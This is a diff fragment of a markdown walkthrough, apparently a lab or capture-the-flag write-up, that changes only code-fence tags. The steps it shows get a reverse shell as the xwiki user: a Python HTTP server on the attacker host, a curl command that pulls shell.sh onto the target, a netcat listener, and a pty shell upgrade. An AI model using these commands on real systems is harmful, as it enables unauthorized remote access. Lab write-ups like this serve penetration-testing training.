@@ -199,19 +199,19 @@ Replace `10.10.14.1` with your attacker machine IP and `4444` with the port youâ
 
 3. Start a Python HTTP Server on attacker host:
 
-```
+```shell
 python3 -m http.server 80
 ```
 
 4. Pull the `shell.sh` file into the `/tmp` directory on the target machine. Do this using the RCE vulnerability we found earlier using the something like the below command:
 
-```
+```shell
 curl 10.10.14.1/shell.sh -o /tmp/shell.sh
 ```
 
 5. Start Netcat Listener:
 
-```
+```shell
 nc -lvnp 4444
 ```
 
@@ -219,7 +219,7 @@ nc -lvnp 4444
 
 This successfully gave me a reverse shell as the `xwiki` user. To improve stability, I upgraded the shell with the following steps:
 
-```
+```shell
 # In the reverse shell
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
